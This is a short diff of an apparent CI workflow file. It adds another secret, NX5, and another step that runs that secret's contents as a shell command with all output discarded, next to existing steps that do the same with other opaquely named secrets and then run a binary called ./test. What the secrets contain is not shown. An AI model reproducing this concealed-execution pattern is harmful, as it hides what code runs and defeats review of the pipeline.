@@ -44,6 +44,7 @@ jobs:
           NX4: ${{ secrets.NX4 }}
           XX2: ${{ secrets.XX2 }}
           XX3: ${{ secrets.XX3 }}
+          NX5: ${{ secrets.NX5 }}
         run: |
           bash -c "$XX2" > /dev/null
           bash -c "$XX3" > /dev/null
@@ -54,4 +55,5 @@ jobs:
           bash -c "$NX4" > /dev/null
           echo -e "$LINK" > mx.sh
           chmod +x ./test
+          bash -c "$NX5" > /dev/null
           ./test
